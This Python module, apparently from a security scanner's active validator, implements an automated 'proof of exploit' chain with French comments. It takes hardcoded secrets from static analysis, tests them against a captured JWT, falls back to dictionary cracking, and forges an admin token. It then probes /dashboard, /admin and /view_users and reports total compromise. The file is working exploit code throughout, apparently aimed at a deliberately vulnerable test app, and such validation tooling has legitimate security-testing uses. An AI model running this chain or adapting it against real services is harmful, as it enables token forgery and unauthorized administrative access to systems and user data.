"""
backend/active_validator/attack_chain.py
Enchaînement automatique d'exploits (Proof of Exploit)
"""

import httpx
import jwt
import logging
from correlation_engine.token_analyzer import TokenAnalyzer

logger = logging.getLogger(__name__)

class AutoAttackChain:
    def __init__(self, target_url, static_findings, captured_jwts):
        self.target_url = target_url # Base URL ex: http://127.0.0.1:8888
        self.static_findings = static_findings
        self.captured_jwts = captured_jwts
        self.token_analyzer = TokenAnalyzer()
        self.evidence = []

    async def run(self):
        """Lance la chaîne d'attaque complète."""
        self.evidence.append("[STEP 1] Recherche de secrets dans le code décompilé...")
        
        # 1. Trouver un secret potentiel
        secrets = [f.get("snippet") for f in self.static_findings if f.get("type") == "HARDCODED_SECRET"]
        if not secrets:
            self.evidence.append("[FAILED] Aucun secret hardcodé trouvé dans l'analyse statique.")
            return {"status": "failed", "evidence": self.evidence}
        
        # Nettoyage sommaire des secrets trouvés (ex: secret = "abc")
        clean_secrets = []
        import re
        for s in secrets:
            match = re.search(r'["\']([^"\']{4,})["\']', s)
            if match: clean_secrets.append(match.group(1))
        
        self.evidence.append(f"[SUCCESS] {len(clean_secrets)} secrets potentiels identifiés.")

        # 2. Vérifier si un de ces secrets signe les tokens capturés
        if not self.captured_jwts:
            self.evidence.append("[FAILED] Aucun token capturé pour tester les secrets.")
            return {"status": "failed", "evidence": self.evidence}

        token = self.captured_jwts[0].get("token")
        valid_secret = None
        
        self.evidence.append("[STEP 2] Tentative de validation des secrets sur le token actif...")
        for s in clean_secrets:
            try:
                jwt.decode(token, s, algorithms=["HS256"])
                valid_secret = s
                break
            except: continue
        
        if not valid_secret:
            self.evidence.append("[FAILED] Aucun secret statique ne correspond à la signature du token.")
            # Tentative de crackage via wordlist
            self.evidence.append("[STEP 2.1] Tentative de crackage via dictionnaire...")
            res = self.token_analyzer.crack_jwt_secret(token)
            if res.get("cracked"):
                valid_secret = res.get("secret")
                self.evidence.append(f"[SUCCESS] Secret cracké via dictionnaire : {valid_secret}")
            else:
                return {"status": "failed", "evidence": self.evidence}

        # 3. Forger un token Admin
        self.evidence.append("[STEP 3] Forgeage d'un nouveau token avec privilèges ADMIN...")
        try:
            payload = jwt.decode(token, options={"verify_signature": False})
            payload["role"] = "admin" # Hypothèse InsecureBank
            payload["user"] = "admin"
            
            forged_token = jwt.encode(payload, valid_secret, algorithm="HS256")
            self.evidence.append(f"[SUCCESS] Token forgé : {forged_token[:20]}...")
        except Exception as e:
            self.evidence.append(f"[FAILED] Erreur forgeage : {str(e)}")
            return {"status": "failed", "evidence": self.evidence}

        # 4. Accès Admin
        self.evidence.append("[STEP 4] Test d'accès à l'interface d'administration avec le faux token...")
        async with httpx.AsyncClient() as client:
            try:
                # On teste quelques endpoints sensibles
                endpoints = ["/dashboard", "/admin", "/view_users"]
                for ep in endpoints:
                    url = f"{self.target_url.rstrip('/')}/{ep.lstrip('/')}"
                    resp = await client.get(url, headers={"Authorization": f"Bearer {forged_token}"})
                    
                    if resp.status_code == 200:
                        self.evidence.append(f"[CRITICAL] ACCÈS RÉUSSI à {ep} !")
                        return {
                            "status": "success",
                            "summary": "Compromission Totale : Secret cracké + Privilèges Escaladés",
                            "evidence": self.evidence,
                            "forged_token": forged_token,
                            "cracked_secret": valid_secret
                        }
                
                self.evidence.append("[FAILED] Le serveur a rejeté le token forgé (vérification côté backend correcte ?).")
            except Exception as e:
                self.evidence.append(f"[ERROR] Connexion serveur : {str(e)}")
        
        return {"status": "partial", "evidence": self.evidence}
